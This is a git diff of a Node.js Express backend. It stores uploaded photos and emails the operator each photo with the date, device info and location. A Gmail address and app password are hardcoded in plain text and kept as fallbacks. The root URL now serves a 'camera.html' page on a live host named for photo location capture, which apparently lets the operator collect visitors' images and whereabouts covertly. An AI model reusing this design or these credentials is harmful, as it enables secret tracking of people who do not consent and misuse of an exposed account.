@@ -6,7 +6,7 @@ const nodemailer = require("nodemailer");
 const fs = require("fs");
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 const uploadPath = "uploads/";
 
 app.use(cors());
@@ -26,21 +26,26 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage });
 
-// Gmail setup
+// Gmail setup (Render Environment Variables)
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
-    user: "ajaykumar155126@gmail.com", // आपका Gmail
-    pass: "jrqc dupo xilq fbit", // आपका App Password
+    user: process.env.EMAIL_USER || "ajaykumar155126@gmail.com",
+    pass: process.env.EMAIL_PASS || "jrqc dupo xilq fbit",
   },
 });
 
-// Upload route
+// 🔹 Serve camera.html from root URL
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "camera.html"));
+});
+
+// 🔹 Upload route
 app.post("/upload", upload.single("photo"), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ error: "No file uploaded" });
 
-    const backendUrl = "http://localhost:3000";
+    const backendUrl = "https://backend-photo-loaction.onrender.com"; // ← Render live URL
     const photoURL = `${backendUrl}/${req.file.filename}`;
 
     // System info & location details
@@ -57,11 +62,11 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
 
     // Mail content
     const mailOptions = {
-      from: "ajaykumar155126@gmail.com",
-      to: "ajaykumar155126@gmail.com",
-      subject: "📸 New Photo Uploaded (Details Included)",
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER,
+      subject: "📸 New Photo Uploaded (Magic Capture Online)",
       html: `
-        <h2>New Photo Uploaded</h2>
+        <h2>New Photo Uploaded 🎉</h2>
         <p><b>📅 Date & Time:</b> ${date}</p>
         <p><b>💻 Device Info:</b> ${device}</p>
         <p><b>🌍 Location:</b> <a href="${locationInfo}" target="_blank">${locationInfo}</a></p>
@@ -72,7 +77,6 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
 
     // Send mail
     await transporter.sendMail(mailOptions);
-
     console.log("✅ Email sent successfully!");
     res.json({
       message: "✅ Photo uploaded & email sent successfully!",
